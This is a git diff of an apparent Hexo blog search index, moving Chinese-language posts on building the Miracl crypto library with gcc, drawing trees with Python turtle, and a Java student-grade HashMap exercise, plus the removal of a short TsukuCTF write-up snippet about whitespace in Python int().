class="number">100</span>,x);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,y);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,z);</span><br><span class="line">    <span class="built_in">add</span>(x,y, z);</span><br><span class="line">    <span class="built_in">cotnum</span>(z,stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>点击CB中的生成并运行按钮，如图所示。</p>
+<img data-src="/posts/2543483413/pasted-5.png" class="" title="运行结果图">
+</li>
+<li><p>gcc编译命令为:</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc filename.c miracl.a -o filename</span><br><span class="line">./filename.exe</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://www.cnblogs.com/little-kwy/p/12285955.html">树莓派下编译并使用miracl密码库</a></li>
+<li><a href="https://blog.csdn.net/joker_clown/article/details/83662846">win10+gcc+miracl</a></li>
 </ul>
-<p><code>python</code>中使用<code>int</code>进行强制类型转换时会忽略两侧的空格，提交<code>q=   4567890</code>即可</p>
-<pre><code class="json">&#123;
-    &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot;
-&#125;
-</code></pre>
-<p><strong>flag:</strong><code>TsukuCTF&#123;you_are_lucky_Tsukushi&#125; </code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>TsukuCTF</tag>
+        <tag>Miracl</tag>
+        <tag>密码学</tag>
       </tags>
   </entry>
   <entry>
@@ -3578,50 +3625,18 @@ def main(q: Optional[str] = None):
       </tags>
   </entry>
   <entry>
-    <title>Windows下编译Miracl密码库</title>
-    <url>/posts/2543483413/</url>
-    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。</p>
-<h1 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h1><ul>
-<li><a href="http://www.codeblocks.org/downloads">CodeBlocks</a></li>
-<li><a href="https://gitforwindows.org/">Git Bash</a><span id="more"></span></li>
-</ul>
-<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><ol>
-<li>从Github上下载项目最新源码。(<a href="https://github.com/miracl/MIRACL/archive/master.zip">下载地址</a>)</li>
-<li>打开Git Bash,创建一个文件夹<code>miracl</code>，并将压缩文件拷贝至此。<br><code>mkdir miracl</code></li>
-<li>打开Git Bash，输入如下命令，将所有文件解压到一个目录中。<br><code>unzip -j -aa -L master.zip</code></li>
-<li>编辑<code>gcdoit.bat</code>，注释掉最后几行并保存。<img data-src="/posts/2543483413/pasted-1.png" class=""></li>
-<li>执行<code>gcdoit.bat</code>,生成的<code>miracl.a</code>即为编译好的库。</li>
-</ol>
-<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><ol>
-<li><p>打开CodeBlocks，新建Console application项目。</p>
-<img data-src="/posts/2543483413/pasted-2.png" class=""></li>
-<li><p>将<code>mirdef.h</code>、<code>miracl.h</code>、<code>miracl.a</code>拷贝至项目根目录。</p>
-</li>
-<li><p>对着CB左侧工作空间中的项目名右键，点击添加文件,将上述三个文件添加至项目中。</p>
-<img data-src="/posts/2543483413/pasted-3.png" class=""></li>
-<li><p>CB会弹出如下错误提示,莫慌.</p>
-<img data-src="/posts/2543483413/error.png" class=""></li>
-<li><p>对着CB左侧工作空间中的项目名右键,点击生成选项,修改链接器设置.</p>
-<img data-src="/posts/2543483413/pasted-4.png" class="">
-<div class="note warning">
-            <p>环境设置选择: 仅使用项目选项</p>
-          </div></li>
-<li><p>在<code>main.c</code>中输入如下代码，进行测试。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;miracl.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    big x,y,z;</span><br><span class="line">    miracl *mip = <span class="built_in">mirsys</span>(<span class="number">1000</span>, <span class="number">16</span>);</span><br><span class="line">    x= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    y= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    z= <span class="built_in">mirvar</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,x);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,y);</span><br><span class="line">    <span class="built_in">bigbits</span>(<span class="number">100</span>,z);</span><br><span class="line">    <span class="built_in">add</span>(x,y, z);</span><br><span class="line">    <span class="built_in">cotnum</span>(z,stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>点击CB中的生成并运行按钮，如图所示。</p>
-<img data-src="/posts/2543483413/pasted-5.png" class="" title="运行结果图">
-</li>
-<li><p>gcc编译命令为:</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc filename.c miracl.a -o filename</span><br><span class="line">./filename.exe</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
-<li><a href="https://www.cnblogs.com/little-kwy/p/12285955.html">树莓派下编译并使用miracl密码库</a></li>
-<li><a href="https://blog.csdn.net/joker_clown/article/details/83662846">win10+gcc+miracl</a></li>
-</ul>
+    <title>利用Python画小树和森林（宽度优先绘制+深度优先绘制)</title>
+    <url>/posts/15900/</url>
+    <content><![CDATA[<p>在中M上看嵩天老师的<a href="http://www.icourse163.org/learn/BIT-268001">《Python语言程序设计》</a>时,视频中给出了宽度优先绘制法的代码,仅提了一下还有另外一种画法(深度优先绘制法).联系到最近学的数据结构，摸索出了另一种画法。</p>
+<span id="more"></span>
+<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 2, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># drawtree.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> Turtle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">plist, l, a, f</span>):</span><br><span class="line">    <span class="comment">#宽度优先绘制法</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; plist is list of pens</span></span><br><span class="line"><span class="string">    l is length of branch</span></span><br><span class="line"><span class="string">    a is half of the angle between 2 branches</span></span><br><span class="line"><span class="string">    f is factor by which branch is shortened</span></span><br><span class="line"><span class="string">    from level to level.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> l &gt; <span class="number">5</span>:</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> plist:</span><br><span class="line">            p.forward(l)<span class="comment">#Move the turtle forward by the specified distance, in the direction the turtle is headed.</span></span><br><span class="line">            q = p.clone()<span class="comment">#Create and return a clone of the turtle with same position, heading and turtle properties.</span></span><br><span class="line">            p.left(a) <span class="comment">#Turn turtle left by angle units</span></span><br><span class="line">            q.right(a)<span class="comment"># turn turtle right by angle units, nits are by default degrees, but can be set via the degrees() and radians() functions.</span></span><br><span class="line">            lst.append(p)</span><br><span class="line">            lst.append(q)</span><br><span class="line">        tree(lst, l*f, a, f)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree2</span>(<span class="params">p,l,a,f</span>):</span><br><span class="line">    <span class="comment">#深度优先绘制法</span></span><br><span class="line">    <span class="keyword">if</span> l&gt;<span class="number">5</span>:</span><br><span class="line">        p.forward(l)</span><br><span class="line">        q=p.clone()</span><br><span class="line">        p.left(a)</span><br><span class="line">        q.right(a)</span><br><span class="line">        tree2(p, l*f, a, f)</span><br><span class="line">        tree2(q, l*f, a, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maketree</span>(<span class="params">x,y</span>):     </span><br><span class="line">    p = Turtle()</span><br><span class="line">    p.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">    p.pensize(<span class="number">5</span>)</span><br><span class="line">    p.setundobuffer(<span class="literal">None</span>)</span><br><span class="line">    p.hideturtle() </span><br><span class="line">    <span class="comment">#Make the turtle invisible. It’s a good idea to do this while you’re in the middle of doing some complex drawing,</span></span><br><span class="line">    <span class="comment">#because hiding the turtle speeds up the drawing observably.</span></span><br><span class="line">    <span class="comment">#p.speed(9)</span></span><br><span class="line">    p.getscreen().tracer(<span class="number">1</span>,<span class="number">0</span>)<span class="comment">#Return the TurtleScreen object the turtle is drawing on.</span></span><br><span class="line">    <span class="comment">#TurtleScreen methods can then be called for that object.</span></span><br><span class="line">    p.left(<span class="number">90</span>)<span class="comment"># Turn turtle left by angle units. direction</span></span><br><span class="line"> </span><br><span class="line">    p.penup() <span class="comment">#Pull the pen up – no drawing when moving.</span></span><br><span class="line">    p.goto(x,y)<span class="comment">#Move turtle to an absolute position. If the pen is down, draw line. Do not change the turtle’s orientation.</span></span><br><span class="line">    p.pendown()<span class="comment"># Pull the pen down – drawing when moving. </span></span><br><span class="line">    <span class="comment">#这三条语句是一个组合相当于先把笔收起来再移动到指定位置，再把笔放下开始画.否则turtle一移动就会自动的把线画出来</span></span><br><span class="line"> </span><br><span class="line">    tree([p], <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>)</span><br><span class="line">    </span><br><span class="line">    p.penup() </span><br><span class="line">    p.setheading(<span class="number">90</span>)<span class="comment">#Set the orientation of the turtle to to_angle.</span></span><br><span class="line">    p.goto(x,y)</span><br><span class="line">    p.down()</span><br><span class="line">    p.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    tree2(p, <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maketree(-<span class="number">200</span>, -<span class="number">200</span>)</span><br><span class="line">    maketree(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    maketree(<span class="number">200</span>,-<span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/20171202204712994.jpg"></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
       <tags>
-        <tag>Miracl</tag>
-        <tag>密码学</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -3653,21 +3668,6 @@ def main(q: Optional[str] = None):
       <tags>
         <tag>C#</tag>
         <tag>.NET</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用Python画小树和森林（宽度优先绘制+深度优先绘制)</title>
-    <url>/posts/15900/</url>
-    <content><![CDATA[<p>在中M上看嵩天老师的<a href="http://www.icourse163.org/learn/BIT-268001">《Python语言程序设计》</a>时,视频中给出了宽度优先绘制法的代码,仅提了一下还有另外一种画法(深度优先绘制法).联系到最近学的数据结构，摸索出了另一种画法。</p>
-<span id="more"></span>
-<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 2, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># drawtree.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> Turtle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">plist, l, a, f</span>):</span><br><span class="line">    <span class="comment">#宽度优先绘制法</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; plist is list of pens</span></span><br><span class="line"><span class="string">    l is length of branch</span></span><br><span class="line"><span class="string">    a is half of the angle between 2 branches</span></span><br><span class="line"><span class="string">    f is factor by which branch is shortened</span></span><br><span class="line"><span class="string">    from level to level.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> l &gt; <span class="number">5</span>:</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> plist:</span><br><span class="line">            p.forward(l)<span class="comment">#Move the turtle forward by the specified distance, in the direction the turtle is headed.</span></span><br><span class="line">            q = p.clone()<span class="comment">#Create and return a clone of the turtle with same position, heading and turtle properties.</span></span><br><span class="line">            p.left(a) <span class="comment">#Turn turtle left by angle units</span></span><br><span class="line">            q.right(a)<span class="comment"># turn turtle right by angle units, nits are by default degrees, but can be set via the degrees() and radians() functions.</span></span><br><span class="line">            lst.append(p)</span><br><span class="line">            lst.append(q)</span><br><span class="line">        tree(lst, l*f, a, f)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree2</span>(<span class="params">p,l,a,f</span>):</span><br><span class="line">    <span class="comment">#深度优先绘制法</span></span><br><span class="line">    <span class="keyword">if</span> l&gt;<span class="number">5</span>:</span><br><span class="line">        p.forward(l)</span><br><span class="line">        q=p.clone()</span><br><span class="line">        p.left(a)</span><br><span class="line">        q.right(a)</span><br><span class="line">        tree2(p, l*f, a, f)</span><br><span class="line">        tree2(q, l*f, a, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maketree</span>(<span class="params">x,y</span>):     </span><br><span class="line">    p = Turtle()</span><br><span class="line">    p.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">    p.pensize(<span class="number">5</span>)</span><br><span class="line">    p.setundobuffer(<span class="literal">None</span>)</span><br><span class="line">    p.hideturtle() </span><br><span class="line">    <span class="comment">#Make the turtle invisible. It’s a good idea to do this while you’re in the middle of doing some complex drawing,</span></span><br><span class="line">    <span class="comment">#because hiding the turtle speeds up the drawing observably.</span></span><br><span class="line">    <span class="comment">#p.speed(9)</span></span><br><span class="line">    p.getscreen().tracer(<span class="number">1</span>,<span class="number">0</span>)<span class="comment">#Return the TurtleScreen object the turtle is drawing on.</span></span><br><span class="line">    <span class="comment">#TurtleScreen methods can then be called for that object.</span></span><br><span class="line">    p.left(<span class="number">90</span>)<span class="comment"># Turn turtle left by angle units. direction</span></span><br><span class="line"> </span><br><span class="line">    p.penup() <span class="comment">#Pull the pen up – no drawing when moving.</span></span><br><span class="line">    p.goto(x,y)<span class="comment">#Move turtle to an absolute position. If the pen is down, draw line. Do not change the turtle’s orientation.</span></span><br><span class="line">    p.pendown()<span class="comment"># Pull the pen down – drawing when moving. </span></span><br><span class="line">    <span class="comment">#这三条语句是一个组合相当于先把笔收起来再移动到指定位置，再把笔放下开始画.否则turtle一移动就会自动的把线画出来</span></span><br><span class="line"> </span><br><span class="line">    tree([p], <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>)</span><br><span class="line">    </span><br><span class="line">    p.penup() </span><br><span class="line">    p.setheading(<span class="number">90</span>)<span class="comment">#Set the orientation of the turtle to to_angle.</span></span><br><span class="line">    p.goto(x,y)</span><br><span class="line">    p.down()</span><br><span class="line">    p.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    tree2(p, <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maketree(-<span class="number">200</span>, -<span class="number">200</span>)</span><br><span class="line">    maketree(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    maketree(<span class="number">200</span>,-<span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/20171202204712994.jpg"></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -4049,6 +4049,26 @@ Hagzou Jigxng
       </tags>
   </entry>
   <entry>
+    <title>第三周讨论区_学生成绩的数据结构</title>
+    <url>/posts/13223/</url>
+    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>如果要写程序表达一个班级的很多个学生的很多门课的成绩，应该如何表达这些数据？</p>
+<p>如果我们希望通过学生的姓名，可以找到他的所有的成绩，而每一门课的成绩，是由课程名称和分数构成的。</p>
+<p>而如果我们还希望这个程序能找出某一门课的全部学生的成绩应该怎样做呢？</p>
+<p>注意，并非所有的学生都参加了所有的课程。</p>
+<span id="more"></span>
+<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student_Grade</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Double&gt;&gt; studentInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Double&gt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名添加成绩</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name, String course, <span class="type">double</span> grade)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.containsKey(name))</span><br><span class="line">		&#123;</span><br><span class="line">			studentInfo.get(name).put(course, grade);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">			temp.put(course, grade);</span><br><span class="line">			studentInfo.put(name, temp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (k == name)</span><br><span class="line">			&#123;</span><br><span class="line">				temp = studentInfo.get(name);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name+<span class="string">&quot; &quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">			&#123;</span><br><span class="line">				temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> subject+<span class="string">&quot;:&quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		String temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(String k:studentInfo.keySet())</span><br><span class="line">			temp+=(k+<span class="string">&quot;:&quot;</span>+studentInfo.get(k).toString()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Student_Grade</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student_Grade</span>();</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;Java&quot;</span>, <span class="number">60.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">70.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;李四&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">80.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;王五&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">90.2</span>);</span><br><span class="line">		System.out.println(student.getScore_name(<span class="string">&quot;张三&quot;</span>));</span><br><span class="line">		System.out.println(student.getScore_subject(<span class="string">&quot;C++&quot;</span>));</span><br><span class="line">		System.out.println(student);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h2><p><img data-src="/images/20170821012136233.jpg"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>起初，两个查询的方法如下所示，返回值是一个Hasmap&lt;String,Doubole&gt;。</p>
+<p>后来在为Student_Grade写<code>toString（）</code>方法以便输出所有学生的所有成绩时，想到可以在两个查询的方法中临时建立一个String，调用<code>toString()</code>方法，赋值给它，并对该字符串进行处理，返回一个字符串。使得输出有”姓名“和”课程名“，信息更完整。（强迫症）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (k == name)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = studentInfo.get(name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">		&#123;</span><br><span class="line">			temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>面向对象程序设计_Java语言_翁恺</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第二周编程题_有秒计时的数字时钟</title>
     <url>/posts/2173/</url>
     <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>&#160; &#160; &#160; &#160;这一周的编程题是需要你在课程所给的时钟程序的基础上修改而成。但是我们并不直接给你时钟程序的代码，请根据视频自己输入时钟程序的Display和Clock类的代码，然后来做这个题目。<br>&#160; &#160; &#160; &#160;我们需要给时钟程序加上一个表示秒的Display，然后为Clock增加以下public的成员函数：</p>
@@ -4079,26 +4099,6 @@ in.close();
 <p>没写toString()方法时，输出为：<br>面向对象程序设计_Java语言_翁恺.Clock@7d4991ad</p>
 <h2 id="学习心得："><a href="#学习心得：" class="headerlink" title="学习心得："></a>学习心得：</h2><p>toString（）方法是Object类的一个实例方法，所有的Java类都是Object类的子类，故所有的Java类都有toString（）方法。<br>除此外，所有的Java类的对象都可以和字符串进行连接运算，当Java类对象和字符串进行连接运算时，系统自动调用Java对象toString（）方法的返回值和字符串进行连接操作，如：<br>&#160; &#160; &#160; &#160;String str&#x3D;p+“123”；<br>&#160; &#160; &#160; &#160;String str&#x3D;p.toString()+&quot;123&quot;;<br>toString()方法是一个非常特殊的方法，是一个“自我描述”方法，该方法通常用于实现当程序员直接打印该对象时，系统将会输出该对象的“自我描述”信息，用以告诉外界该对象具有的状态信息。<br>Object类提供的toString()方法总是返回该对象实现类的”类名+@+hashCode”值，这个返回值不能真正实现“自我描述”功能，因此我们可以重写object的toString()方法。</p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>面向对象程序设计_Java语言_翁恺</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第三周讨论区_学生成绩的数据结构</title>
-    <url>/posts/13223/</url>
-    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>如果要写程序表达一个班级的很多个学生的很多门课的成绩，应该如何表达这些数据？</p>
-<p>如果我们希望通过学生的姓名，可以找到他的所有的成绩，而每一门课的成绩，是由课程名称和分数构成的。</p>
-<p>而如果我们还希望这个程序能找出某一门课的全部学生的成绩应该怎样做呢？</p>
-<p>注意，并非所有的学生都参加了所有的课程。</p>
-<span id="more"></span>
-<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student_Grade</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Double&gt;&gt; studentInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Double&gt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名添加成绩</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name, String course, <span class="type">double</span> grade)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.containsKey(name))</span><br><span class="line">		&#123;</span><br><span class="line">			studentInfo.get(name).put(course, grade);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">			temp.put(course, grade);</span><br><span class="line">			studentInfo.put(name, temp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (k == name)</span><br><span class="line">			&#123;</span><br><span class="line">				temp = studentInfo.get(name);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			